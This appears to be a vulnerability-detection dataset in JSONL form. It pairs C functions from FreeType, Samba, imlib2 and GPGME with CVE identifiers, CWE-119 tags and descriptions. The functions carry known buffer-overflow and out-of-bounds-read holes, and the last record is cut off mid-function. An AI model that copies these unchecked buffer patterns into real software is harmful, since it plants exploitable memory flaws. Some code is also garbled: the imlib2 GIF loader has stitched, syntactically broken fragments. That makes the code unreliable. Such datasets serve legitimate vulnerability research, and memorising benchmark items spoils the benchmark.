{"idx": 158126, "project": "savannah", "commit_id": "c69891a1345640096fbf396e8dd567fe879ce233", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c69891a1345640096fbf396e8dd567fe879ce233", "commit_message": "None", "target": 0, "func": "  Mac_Read_POST_Resource( FT_Library  library,\n                          FT_Stream   stream,\n                          FT_Long    *offsets,\n                          FT_Long     resource_cnt,\n                          FT_Long     face_index,\n                          FT_Face    *aface )\n  {\n    FT_Error   error  = FT_Err_Cannot_Open_Resource;\n    FT_Memory  memory = library->memory;\n    FT_Byte*   pfb_data;\n    int        i, type, flags;\n    FT_Long    len;\n    FT_Long    pfb_len, pfb_pos, pfb_lenpos;\n    FT_Long    rlen, temp;\n\n\n    if ( face_index == -1 )\n      face_index = 0;\n    if ( face_index != 0 )\n      return error;\n\n    /* Find the length of all the POST resources, concatenated.  Assume */\n    /* worst case (each resource in its own section).                   */\n    pfb_len = 0;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit;\n      if ( FT_READ_LONG( temp ) )\n        goto Exit;\n      pfb_len += temp + 6;\n    }\n\n    if ( FT_ALLOC( pfb_data, (FT_Long)pfb_len + 2 ) )\n      goto Exit;\n\n    pfb_data[0] = 0x80;\n    pfb_data[1] = 1;            /* Ascii section */\n    pfb_data[2] = 0;            /* 4-byte length, fill in later */\n    pfb_data[3] = 0;\n    pfb_data[4] = 0;\n    pfb_data[5] = 0;\n    pfb_pos     = 6;\n    pfb_lenpos  = 2;\n\n    len = 0;\n    type = 1;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit2;\n      if ( FT_READ_LONG( rlen ) )\n        goto Exit;\n      if ( FT_READ_USHORT( flags ) )\n        goto Exit;\n      rlen -= 2;                    /* the flags are part of the resource */\n      if ( ( flags >> 8 ) == type )\n        len += rlen;\n      else\n      {\n        pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n        pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n        pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n        pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n        if ( ( flags >> 8 ) == 5 )      /* End of font mark */\n          break;\n\n        pfb_data[pfb_pos++] = 0x80;\n\n        type = flags >> 8;\n        len = rlen;\n\n        pfb_data[pfb_pos++] = (FT_Byte)type;\n        pfb_lenpos          = pfb_pos;\n        pfb_data[pfb_pos++] = 0;        /* 4-byte length, fill in later */\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n       }\n \n       error = FT_Stream_Read( stream, (FT_Byte *)pfb_data + pfb_pos, rlen );\n      if ( error )\n        goto Exit2;\n       pfb_pos += rlen;\n     }\n\n    pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n    pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n    pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n    pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n    return open_face_from_buffer( library,\n                                  pfb_data,\n                                  pfb_pos,\n                                  face_index,\n                                  \"type1\",\n                                  aface );\n\n  Exit2:\n    FT_FREE( pfb_data );\n\n  Exit:\n    return error;\n  }\n", "func_hash": 104194448279931618216830643509594183948, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2499", "cve_desc": "Buffer overflow in the Mac_Read_POST_Resource function in base/ftobjs.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted LaserWriter PS font file with an embedded PFB fragment.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2499"}
{"idx": 158146, "project": "samba", "commit_id": "9280051bfba337458722fb157f3082f93cbd9f2b", "project_url": "https://github.com/samba-team/samba", "commit_url": "https://git.samba.org/?p=samba.git;a=commit;h=9280051bfba337458722fb157f3082f93cbd9f2b", "commit_message": "s3: Fix an uninitialized variable read\n\nFound by Laurent Gaffie <laurent.gaffie@gmail.com>\n\nThanks for that,\n\nVolker\n\nFix bug #7254 (An uninitialized variable read could cause an smbd crash).", "target": 0, "func": "static void reply_sesssetup_and_X_spnego(struct smb_request *req)\n{\n\tconst uint8 *p;\n\tDATA_BLOB blob1;\n\tsize_t bufrem;\n\tchar *tmp;\n\tconst char *native_os;\n\tconst char *native_lanman;\n\tconst char *primary_domain;\n\tconst char *p2;\n\tuint16 data_blob_len = SVAL(req->vwv+7, 0);\n\tenum remote_arch_types ra_type = get_remote_arch();\n\tint vuid = req->vuid;\n\tuser_struct *vuser = NULL;\n\tNTSTATUS status = NT_STATUS_OK;\n\tuint16 smbpid = req->smbpid;\n\tstruct smbd_server_connection *sconn = smbd_server_conn;\n\n\tDEBUG(3,(\"Doing spnego session setup\\n\"));\n\n\tif (global_client_caps == 0) {\n\t\tglobal_client_caps = IVAL(req->vwv+10, 0);\n\n\t\tif (!(global_client_caps & CAP_STATUS32)) {\n\t\t\tremove_from_common_flags2(FLAGS2_32_BIT_ERROR_CODES);\n\t\t}\n\n\t}\n\n\tp = req->buf;\n\n\tif (data_blob_len == 0) {\n\t\t/* an invalid request */\n\t\treply_nterror(req, nt_status_squash(NT_STATUS_LOGON_FAILURE));\n\t\treturn;\n\t}\n\n\tbufrem = smbreq_bufrem(req, p);\n\t/* pull the spnego blob */\n\tblob1 = data_blob(p, MIN(bufrem, data_blob_len));\n\n#if 0\n        file_save(\"negotiate.dat\", blob1.data, blob1.length);\n #endif\n \n       p2 = (char *)req->buf + blob1.length;\n \n        p2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n                                     STR_TERMINATE);\n\tnative_os = tmp ? tmp : \"\";\n\n\tp2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n\t\t\t\t     STR_TERMINATE);\n\tnative_lanman = tmp ? tmp : \"\";\n\n\tp2 += srvstr_pull_req_talloc(talloc_tos(), req, &tmp, p2,\n\t\t\t\t     STR_TERMINATE);\n\tprimary_domain = tmp ? tmp : \"\";\n\n\tDEBUG(3,(\"NativeOS=[%s] NativeLanMan=[%s] PrimaryDomain=[%s]\\n\",\n\t\tnative_os, native_lanman, primary_domain));\n\n\tif ( ra_type == RA_WIN2K ) {\n\t\t/* Vista sets neither the OS or lanman strings */\n\n\t\tif ( !strlen(native_os) && !strlen(native_lanman) )\n\t\t\tset_remote_arch(RA_VISTA);\n\n\t\t/* Windows 2003 doesn't set the native lanman string,\n\t\t   but does set primary domain which is a bug I think */\n\n\t\tif ( !strlen(native_lanman) ) {\n\t\t\tra_lanman_string( primary_domain );\n\t\t} else {\n\t\t\tra_lanman_string( native_lanman );\n\t\t}\n\t}\n\n\t/* Did we get a valid vuid ? */\n\tif (!is_partial_auth_vuid(sconn, vuid)) {\n\t\t/* No, then try and see if this is an intermediate sessionsetup\n\t\t * for a large SPNEGO packet. */\n\t\tstruct pending_auth_data *pad;\n\t\tpad = get_pending_auth_data(sconn, smbpid);\n\t\tif (pad) {\n\t\t\tDEBUG(10,(\"reply_sesssetup_and_X_spnego: found \"\n\t\t\t\t\"pending vuid %u\\n\",\n\t\t\t\t(unsigned int)pad->vuid ));\n\t\t\tvuid = pad->vuid;\n\t\t}\n\t}\n\n\t/* Do we have a valid vuid now ? */\n\tif (!is_partial_auth_vuid(sconn, vuid)) {\n\t\t/* No, start a new authentication setup. */\n\t\tvuid = register_initial_vuid(sconn);\n\t\tif (vuid == UID_FIELD_INVALID) {\n\t\t\tdata_blob_free(&blob1);\n\t\t\treply_nterror(req, nt_status_squash(\n\t\t\t\t\t      NT_STATUS_INVALID_PARAMETER));\n\t\t\treturn;\n\t\t}\n\t}\n\n\tvuser = get_partial_auth_user_struct(sconn, vuid);\n\t/* This MUST be valid. */\n\tif (!vuser) {\n\t\tsmb_panic(\"reply_sesssetup_and_X_spnego: invalid vuid.\");\n\t}\n\n\t/* Large (greater than 4k) SPNEGO blobs are split into multiple\n\t * sessionsetup requests as the Windows limit on the security blob\n\t * field is 4k. Bug #4400. JRA.\n\t */\n\n\tstatus = check_spnego_blob_complete(sconn, smbpid, vuid, &blob1);\n\tif (!NT_STATUS_IS_OK(status)) {\n\t\tif (!NT_STATUS_EQUAL(status,\n\t\t\t\tNT_STATUS_MORE_PROCESSING_REQUIRED)) {\n\t\t\t/* Real error - kill the intermediate vuid */\n\t\t\tinvalidate_vuid(sconn, vuid);\n\t\t}\n\t\tdata_blob_free(&blob1);\n\t\treply_nterror(req, nt_status_squash(status));\n\t\treturn;\n\t}\n\n\tif (blob1.data[0] == ASN1_APPLICATION(0)) {\n\n\t\t/* its a negTokenTarg packet */\n\n\t\treply_spnego_negotiate(req, vuid, blob1,\n\t\t\t\t       &vuser->auth_ntlmssp_state);\n\t\tdata_blob_free(&blob1);\n\t\treturn;\n\t}\n\n\tif (blob1.data[0] == ASN1_CONTEXT(1)) {\n\n\t\t/* its a auth packet */\n\n\t\treply_spnego_auth(req, vuid, blob1,\n\t\t\t\t  &vuser->auth_ntlmssp_state);\n\t\tdata_blob_free(&blob1);\n\t\treturn;\n\t}\n\n\tif (strncmp((char *)(blob1.data), \"NTLMSSP\", 7) == 0) {\n\t\tDATA_BLOB chal;\n\n\t\tif (!vuser->auth_ntlmssp_state) {\n\t\t\tstatus = auth_ntlmssp_start(&vuser->auth_ntlmssp_state);\n\t\t\tif (!NT_STATUS_IS_OK(status)) {\n\t\t\t\t/* Kill the intermediate vuid */\n\t\t\t\tinvalidate_vuid(sconn, vuid);\n\t\t\t\tdata_blob_free(&blob1);\n\t\t\t\treply_nterror(req, nt_status_squash(status));\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tstatus = auth_ntlmssp_update(vuser->auth_ntlmssp_state,\n\t\t\t\t\t\tblob1, &chal);\n\n\t\tdata_blob_free(&blob1);\n\n\t\treply_spnego_ntlmssp(req, vuid,\n\t\t\t\t     &vuser->auth_ntlmssp_state,\n\t\t\t\t     &chal, status, OID_NTLMSSP, false);\n\t\tdata_blob_free(&chal);\n\t\treturn;\n\t}\n\n\t/* what sort of packet is this? */\n\tDEBUG(1,(\"Unknown packet in reply_sesssetup_and_X_spnego\\n\"));\n\n\tdata_blob_free(&blob1);\n\n\treply_nterror(req, nt_status_squash(NT_STATUS_LOGON_FAILURE));\n}\n", "func_hash": 264029160300950657613398871836569816502, "file_name": "sesssetup.c", "file_hash": 54377162305834695452010991557158062329, "cwe": ["CWE-119"], "cve": "CVE-2010-1642", "cve_desc": "The reply_sesssetup_and_X_spnego function in sesssetup.c in smbd in Samba before 3.4.8 and 3.5.x before 3.5.2 allows remote attackers to trigger an out-of-bounds read, and cause a denial of service (process crash), via a \\xff\\xff security blob length in a Session Setup AndX request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-1642"}
{"idx": 158149, "project": "enlightment", "commit_id": "37a96801663b7b4cd3fbe56cc0eb8b6a17e766a8", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=37a96801663b7b4cd3fbe56cc0eb8b6a17e766a8", "commit_message": "None", "target": 0, "func": "load(ImlibImage * im, ImlibProgressFunction progress, char progress_granularity,\n     char immediate_load)\n{\n   static const int    intoffset[] = { 0, 4, 2, 1 };\n   static const int    intjump[] = { 8, 8, 4, 2 };\n   int                 rc;\n   DATA32             *ptr;\n   GifFileType        *gif;\n   GifRowType         *rows;\n   GifRecordType       rec;\n   ColorMapObject     *cmap;\n   int                 i, j, done, bg, r, g, b, w = 0, h = 0;\n   float               per = 0.0, per_inc;\n   int                 last_per = 0, last_y = 0;\n   int                 transp;\n   int                 fd;\n\n   done = 0;\n   rows = NULL;\n   transp = -1;\n\n   /* if immediate_load is 1, then dont delay image laoding as below, or */\n   /* already data in this image - dont load it again */\n   if (im->data)\n      return 0;\n\n   fd = open(im->real_file, O_RDONLY);\n   if (fd < 0)\n      return 0;\n\n#if GIFLIB_MAJOR >= 5\n   gif = DGifOpenFileHandle(fd, NULL);\n#else\n   gif = DGifOpenFileHandle(fd);\n#endif\n   if (!gif)\n     {\n        close(fd);\n        return 0;\n     }\n\n   rc = 0;                      /* Failure */\n\n   do\n     {\n        if (DGifGetRecordType(gif, &rec) == GIF_ERROR)\n          {\n             /* PrintGifError(); */\n             rec = TERMINATE_RECORD_TYPE;\n          }\n        if ((rec == IMAGE_DESC_RECORD_TYPE) && (!done))\n          {\n             if (DGifGetImageDesc(gif) == GIF_ERROR)\n               {\n                  /* PrintGifError(); */\n                  rec = TERMINATE_RECORD_TYPE;\n                  break;\n               }\n             w = gif->Image.Width;\n             h = gif->Image.Height;\n             if (!IMAGE_DIMENSIONS_OK(w, h))\n                goto quit2;\n\n             rows = calloc(h, sizeof(GifRowType *));\n             if (!rows)\n                goto quit2;\n\n             for (i = 0; i < h; i++)\n               {\n                  rows[i] = calloc(w, sizeof(GifPixelType));\n                  if (!rows[i])\n                     goto quit;\n               }\n\n             if (gif->Image.Interlace)\n               {\n                  for (i = 0; i < 4; i++)\n                    {\n                       for (j = intoffset[i]; j < h; j += intjump[i])\n                         {\n                            DGifGetLine(gif, rows[j], w);\n                         }\n                    }\n               }\n             else\n               {\n                  for (i = 0; i < h; i++)\n                    {\n                       DGifGetLine(gif, rows[i], w);\n                    }\n               }\n             done = 1;\n          }\n        else if (rec == EXTENSION_RECORD_TYPE)\n          {\n             int                 ext_code;\n             GifByteType        *ext;\n\n             ext = NULL;\n             DGifGetExtension(gif, &ext_code, &ext);\n             while (ext)\n               {\n                  if ((ext_code == 0xf9) && (ext[1] & 1) && (transp < 0))\n                    {\n                       transp = (int)ext[4];\n                    }\n                  ext = NULL;\n                  DGifGetExtensionNext(gif, &ext);\n               }\n          }\n     }\n   while (rec != TERMINATE_RECORD_TYPE);\n\n   if (transp >= 0)\n     {\n        SET_FLAG(im->flags, F_HAS_ALPHA);\n     }\n   else\n     {\n        UNSET_FLAG(im->flags, F_HAS_ALPHA);\n     }\n   if (!rows)\n     {\n        goto quit2;\n     }\n\n   /* set the format string member to the lower-case full extension */\n   /* name for the format - so example names would be: */\n   /* \"png\", \"jpeg\", \"tiff\", \"ppm\", \"pgm\", \"pbm\", \"gif\", \"xpm\" ... */\n   im->w = w;\n   im->h = h;\n   if (!im->format)\n      im->format = strdup(\"gif\");\n \n    if (im->loader || immediate_load || progress)\n      {\n        DATA32 colormap[256];\n\n         bg = gif->SBackGroundColor;\n         cmap = (gif->Image.ColorMap ? gif->Image.ColorMap : gif->SColorMap);\n        memset (colormap, 0, sizeof(colormap));\n        if (cmap != NULL)\n           {\n              for (i = cmap->ColorCount > 256 ? 256 : cmap->ColorCount; i-- > 0;)\n                 {\n                    r = cmap->Colors[i].Red;\n                    g = cmap->Colors[i].Green;\n                    b = cmap->Colors[i].Blue;\n                    colormap[i] = (0xff << 24) | (r << 16) | (g << 8) | b;\n                 }\n              /* if bg > cmap->ColorCount, it is transparent black already */\n              if (transp >= 0 && transp < 256)\n                 colormap[transp] = bg >= 0 && bg < 256 ? colormap[bg] & 0x00ffffff : 0x00000000;\n           }\n         im->data = (DATA32 *) malloc(sizeof(DATA32) * w * h);\n         if (!im->data)\n            goto quit;\n                    {\n                       r = cmap->Colors[bg].Red;\n                       g = cmap->Colors[bg].Green;\n                       b = cmap->Colors[bg].Blue;\n                       *ptr++ = 0x00ffffff & ((r << 16) | (g << 8) | b);\n                    }\n                  else\n                    {\n                       r = cmap->Colors[rows[i][j]].Red;\n                       g = cmap->Colors[rows[i][j]].Green;\n                       b = cmap->Colors[rows[i][j]].Blue;\n                       *ptr++ = (0xff << 24) | (r << 16) | (g << 8) | b;\n           {\n              for (j = 0; j < w; j++)\n                {\n                  *ptr++ = colormap[rows[i][j]];\n                   per += per_inc;\n                   if (progress && (((int)per) != last_per)\n                       && (((int)per) % progress_granularity == 0))\n                         {\n                            rc = 2;\n                            goto quit;\n                         }\n                       last_y = i;\n                    }\n               }\n          }\n\n      finish:\n        if (progress)\n           progress(im, 100, 0, last_y, w, h);\n     }\n\n   rc = 1;                      /* Success */\n\n quit:\n   for (i = 0; i < h; i++)\n      free(rows[i]);\n   free(rows);\n\n quit2:\n#if GIFLIB_MAJOR > 5 || (GIFLIB_MAJOR == 5 && GIFLIB_MINOR >= 1)\n   DGifCloseFile(gif, NULL);\n#else\n   DGifCloseFile(gif);\n#endif\n\n   return rc;\n}\n", "func_hash": 327794120807518814236575440422420435138, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-3994", "cve_desc": "The GIF loader in imlib2 before 1.4.9 allows remote attackers to cause a denial of service (application crash) or obtain sensitive information via a crafted image, which triggers an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3994"}
{"idx": 158150, "project": "enlightment", "commit_id": "ce94edca1ccfbe314cb7cd9453433fad404ec7ef", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?id=ce94edca1ccfbe314cb7cd9453433fad404ec7ef", "commit_message": "None", "target": 0, "func": "__imlib_MergeUpdate(ImlibUpdate * u, int w, int h, int hgapmax)\n{\n   ImlibUpdate        *nu = NULL, *uu;\n   struct _tile       *t;\n   int                 tw, th, x, y, i;\n   int                *gaps = NULL;\n\n   /* if theres no rects to process.. return NULL */\n   if (!u)\n      return NULL;\n   tw = w >> TB;\n   if (w & TM)\n      tw++;\n   th = h >> TB;\n   if (h & TM)\n      th++;\n   t = malloc(tw * th * sizeof(struct _tile));\n   /* fill in tiles to be all not used */\n   for (i = 0, y = 0; y < th; y++)\n     {\n        for (x = 0; x < tw; x++)\n           t[i++].used = T_UNUSED;\n     }\n   /* fill in all tiles */\n   for (uu = u; uu; uu = uu->next)\n     {\n        CLIP(uu->x, uu->y, uu->w, uu->h, 0, 0, w, h);\n        for (y = uu->y >> TB; y <= ((uu->y + uu->h - 1) >> TB); y++)\n          {\n             for (x = uu->x >> TB; x <= ((uu->x + uu->w - 1) >> TB); x++)\n                T(x, y).used = T_USED;\n          }\n     }\n   /* scan each line - if > hgapmax gaps between tiles, then fill smallest */\n   gaps = malloc(tw * sizeof(int));\n   for (y = 0; y < th; y++)\n     {\n        int                 hgaps = 0, start = -1, min;\n        char                have = 1, gap = 0;\n\n        for (x = 0; x < tw; x++)\n           gaps[x] = 0;\n        for (x = 0; x < tw; x++)\n          {\n             if ((have) && (T(x, y).used == T_UNUSED))\n               {\n                  start = x;\n                  gap = 1;\n                  have = 0;\n               }\n             else if ((!have) && (gap) && (T(x, y).used & T_USED))\n               {\n                  gap = 0;\n                  hgaps++;\n                  have = 1;\n                  gaps[start] = x - start;\n               }\n             else if (T(x, y).used & T_USED)\n                have = 1;\n          }\n        while (hgaps > hgapmax)\n          {\n             start = -1;\n             min = tw;\n\n             for (x = 0; x < tw; x++)\n               {\n                  if ((gaps[x] > 0) && (gaps[x] < min))\n                    {\n                       start = x;\n                       min = gaps[x];\n                    }\n               }\n             if (start >= 0)\n               {\n                  gaps[start] = 0;\n                  for (x = start;\n                       T(x, y).used == T_UNUSED; T(x++, y).used = T_USED);\n                  hgaps--;\n               }\n          }\n     }\n   free(gaps);\n   /* coalesce tiles into larger blocks and make new rect list */\n   for (y = 0; y < th; y++)\n     {\n        for (x = 0; x < tw; x++)\n          {\n             if (T(x, y).used & T_USED)\n               {\n                   int                 xx, yy, ww, hh, ok, xww;\n \n                   for (xx = x + 1, ww = 1;\n                       (xx < tw) && (T(xx, y).used & T_USED); xx++, ww++);\n                   xww = x + ww;\n                   for (yy = y + 1, hh = 1, ok = 1;\n                        (yy < th) && (ok); yy++, hh++)\n                    {\n                       for (xx = x; xx < xww; xx++)\n                         {\n                            if (!(T(xx, yy).used & T_USED))\n                              {\n                                 ok = 0;\n                                 hh--;\n                                 break;\n                              }\n                         }\n                    }\n                  for (yy = y; yy < (y + hh); yy++)\n                    {\n                       for (xx = x; xx < xww; xx++)\n                          T(xx, yy).used = T_UNUSED;\n                    }\n                  nu = __imlib_AddUpdate(nu, (x << TB), (y << TB),\n                                         (ww << TB), (hh << TB));\n               }\n          }\n     }\n   free(t);\n   __imlib_FreeUpdates(u);\n   return nu;\n}\n", "func_hash": 35689730528572601890660899349736969741, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2016-3993", "cve_desc": "Off-by-one error in the __imlib_MergeUpdate function in lib/updates.c in imlib2 before 1.4.9 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via crafted coordinates.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3993"}
{"idx": 158219, "project": "gnupg", "commit_id": "2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "project_url": "http://git.gnupg.org/cgi-bin/gitweb.cgi?p=gnupg", "commit_url": "https://git.gnupg.org/cgi-bin/gitweb.cgi?p=gpgme.git;a=commit;h=2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "commit_message": "None", "target": 0, "func": "status_handler (void *opaque, int fd)\n{\n  struct io_cb_data *data = (struct io_cb_data *) opaque;\n  engine_gpgsm_t gpgsm = (engine_gpgsm_t) data->handler_value;\n  gpgme_error_t err = 0;\n  char *line;\n  size_t linelen;\n\n  do\n    {\n      err = assuan_read_line (gpgsm->assuan_ctx, &line, &linelen);\n      if (err)\n\t{\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (gpgsm->assuan_ctx, \"BYE\"); */\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: error from assuan (%d) getting status line : %s\",\n                  fd, err, gpg_strerror (err));\n\t}\n      else if (linelen >= 3\n\t       && line[0] == 'E' && line[1] == 'R' && line[2] == 'R'\n\t       && (line[3] == '\\0' || line[3] == ' '))\n\t{\n\t  if (line[3] == ' ')\n\t    err = atoi (&line[4]);\n\t  if (! err)\n\t    err = gpg_error (GPG_ERR_GENERAL);\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: ERR line - mapped to: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (gpgsm->assuan_ctx, \"BYE\"); */\n\t}\n      else if (linelen >= 2\n\t       && line[0] == 'O' && line[1] == 'K'\n\t       && (line[2] == '\\0' || line[2] == ' '))\n\t{\n\t  if (gpgsm->status.fnc)\n\t    err = gpgsm->status.fnc (gpgsm->status.fnc_value,\n\t\t\t\t     GPGME_STATUS_EOF, \"\");\n\n\t  if (!err && gpgsm->colon.fnc && gpgsm->colon.any)\n            {\n              /* We must tell a colon function about the EOF. We do\n                 this only when we have seen any data lines.  Note\n                 that this inlined use of colon data lines will\n                 eventually be changed into using a regular data\n                 channel. */\n              gpgsm->colon.any = 0;\n              err = gpgsm->colon.fnc (gpgsm->colon.fnc_value, NULL);\n            }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: OK line - final status: %s\",\n                  fd, err ? gpg_strerror (err) : \"ok\");\n\t  _gpgme_io_close (gpgsm->status_cb.fd);\n\t  return err;\n\t}\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && gpgsm->colon.fnc)\n        {\n\t  /* We are using the colon handler even for plain inline data\n             - strange name for that function but for historic reasons\n             we keep it.  */\n          /* FIXME We can't use this for binary data because we\n             assume this is a string.  For the current usage of colon\n             output it is correct.  */\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst;\n          char **aline = &gpgsm->colon.attic.line;\n\t  int *alinelen = &gpgsm->colon.attic.linelen;\n\n\t  if (gpgsm->colon.attic.linesize < *alinelen + linelen + 1)\n\t    {\n\t      char *newline = realloc (*aline, *alinelen + linelen + 1);\n\t      if (!newline)\n\t\terr = gpg_error_from_syserror ();\n              else\n                {\n                  *aline = newline;\n                 gpgsm->colon.attic.linesize = *alinelen + linelen + 1;\n                }\n            }\n          if (!err)\n\t    {\n\t      dst = *aline + *alinelen;\n\n\t      while (!err && src < end)\n\t\t{\n\t\t  if (*src == '%' && src + 2 < end)\n\t\t    {\n\t\t      /* Handle escaped characters.  */\n\t\t      ++src;\n\t\t      *dst = _gpgme_hextobyte (src);\n\t\t      (*alinelen)++;\n\t\t      src += 2;\n\t\t    }\n\t\t  else\n\t\t    {\n\t\t      *dst = *src++;\n\t\t      (*alinelen)++;\n\t\t    }\n\n\t\t  if (*dst == '\\n')\n\t\t    {\n\t\t      /* Terminate the pending line, pass it to the colon\n\t\t\t handler and reset it.  */\n\n\t\t      gpgsm->colon.any = 1;\n\t\t      if (*alinelen > 1 && *(dst - 1) == '\\r')\n\t\t\tdst--;\n\t\t      *dst = '\\0';\n\n\t\t      /* FIXME How should we handle the return code?  */\n\t\t      err = gpgsm->colon.fnc (gpgsm->colon.fnc_value, *aline);\n\t\t      if (!err)\n\t\t\t{\n\t\t\t  dst = *aline;\n\t\t\t  *alinelen = 0;\n\t\t\t}\n\t\t    }\n\t\t  else\n\t\t    dst++;\n\t\t}\n\t    }\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: D line; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'D' && line[1] == ' '\n\t       && gpgsm->inline_data)\n        {\n          char *src = line + 2;\n\t  char *end = line + linelen;\n\t  char *dst = src;\n          gpgme_ssize_t nwritten;\n\n          linelen = 0;\n          while (src < end)\n            {\n              if (*src == '%' && src + 2 < end)\n                {\n                  /* Handle escaped characters.  */\n                  ++src;\n                  *dst++ = _gpgme_hextobyte (src);\n                  src += 2;\n                }\n              else\n                *dst++ = *src++;\n\n              linelen++;\n            }\n\n          src = line + 2;\n          while (linelen > 0)\n            {\n              nwritten = gpgme_data_write (gpgsm->inline_data, src, linelen);\n              if (!nwritten || (nwritten < 0 && errno != EINTR)\n                  || nwritten > linelen)\n                {\n                  err = gpg_error_from_syserror ();\n                  break;\n                }\n              src += nwritten;\n              linelen -= nwritten;\n            }\n\n          TRACE2 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: D inlinedata; final status: %s\",\n                  fd, err? gpg_strerror (err):\"ok\");\n        }\n      else if (linelen > 2\n\t       && line[0] == 'S' && line[1] == ' ')\n\t{\n\t  char *rest;\n\t  gpgme_status_code_t r;\n\n\t  rest = strchr (line + 2, ' ');\n\t  if (!rest)\n\t    rest = line + linelen; /* set to an empty string */\n\t  else\n\t    *(rest++) = 0;\n\n\t  r = _gpgme_parse_status (line + 2);\n\n\t  if (r >= 0)\n\t    {\n\t      if (gpgsm->status.fnc)\n\t\terr = gpgsm->status.fnc (gpgsm->status.fnc_value, r, rest);\n\t    }\n\t  else\n\t    fprintf (stderr, \"[UNKNOWN STATUS]%s %s\", line + 2, rest);\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", gpgsm,\n\t\t  \"fd 0x%x: S line (%s) - final status: %s\",\n                  fd, line+2, err? gpg_strerror (err):\"ok\");\n\t}\n      else if (linelen >= 7\n               && line[0] == 'I' && line[1] == 'N' && line[2] == 'Q'\n               && line[3] == 'U' && line[4] == 'I' && line[5] == 'R'\n               && line[6] == 'E'\n               && (line[7] == '\\0' || line[7] == ' '))\n        {\n          char *keyword = line+7;\n\n          while (*keyword == ' ')\n            keyword++;;\n          default_inq_cb (gpgsm, keyword);\n          assuan_write_line (gpgsm->assuan_ctx, \"END\");\n        }\n\n    }\n  while (!err && assuan_pending_line (gpgsm->assuan_ctx));\n\n  return err;\n}\n", "func_hash": 193381261896924450850721776242232796740, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-3564", "cve_desc": "Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to \"different line lengths in a specific order.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3564"}
{"idx": 158220, "project": "gnupg", "commit_id": "2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "project_url": "http://git.gnupg.org/cgi-bin/gitweb.cgi?p=gnupg", "commit_url": "https://git.gnupg.org/cgi-bin/gitweb.cgi?p=gpgme.git;a=commit;h=2cbd76f7911fc215845e89b50d6af5ff4a83dd77", "commit_message": "None", "target": 0, "func": "status_handler (void *opaque, int fd)\n{\n  struct io_cb_data *data = (struct io_cb_data *) opaque;\n  engine_uiserver_t uiserver = (engine_uiserver_t) data->handler_value;\n  gpgme_error_t err = 0;\n  char *line;\n  size_t linelen;\n\n  do\n    {\n      err = assuan_read_line (uiserver->assuan_ctx, &line, &linelen);\n      if (err)\n\t{\n\t  /* Try our best to terminate the connection friendly.  */\n\t  /*\t  assuan_write_line (uiserver->assuan_ctx, \"BYE\"); */\n          TRACE3 (DEBUG_CTX, \"gpgme:status_handler\", uiserver,\n\t\t  \"fd 0x%x: error from assuan (%d) getting status line : %s\",\n                  fd, err, gpg_strerror (err));\n\t}\n      else if (linelen >= 3\n\t       && line[0] == 'E' && line[1] == 'R' && line[2] == 'R'\n\t       && (line[3] == '\\0' || line[3] == ' '))\n\t{\n\t  if (line[3] == ' ')\n\t    err = atoi (&line[4]);\n\t  if (! 